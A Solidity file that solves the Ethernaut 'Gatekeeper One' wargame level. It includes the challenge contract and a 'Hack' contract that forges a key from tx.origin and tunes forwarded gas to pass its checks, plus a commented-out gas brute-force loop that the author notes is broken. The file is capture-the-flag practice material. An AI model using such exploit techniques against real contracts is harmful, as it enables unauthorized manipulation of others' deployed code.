// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";
contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0); //gasleft should be a multiple of 8191. 
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Hack {

   function hack(address _addr, uint gas) public {
    GatekeeperOne cont = GatekeeperOne(_addr);

    uint16 k16 = uint16(uint160(tx.origin));
    uint64 k64 = uint64(1 << 63) + uint64(k16);
    bytes8 key = bytes8(k64);
    require(cont.enter{gas: gas + 8191*5}(key), "failed"); //gas will be spent and 8191*5 will be left so modifier2 will evaluate to true
  }

  //NOTE: Try catch is not working here - needs a fix
  // But this is a way of how to find gas required - hit and trial method
  // function gasFind() public {
  //   for(uint i = 1; i < 500; i++) {
  //     try hack("0xCC303a21F8B1478258014Ef9775d851d17E32170", i) {
  //       console.log(i); //logs 256 which means 256 gas was required till we reached modifier2 while executing. So, in modifier2 gasleft() returns 8191*5.
  //     }
  //     catch {}
  //   }
  // }
}

//For understanding modifier3 - check this article - https://blog.dixitaditya.com/ethernaut-level-13-gatekeeper-one
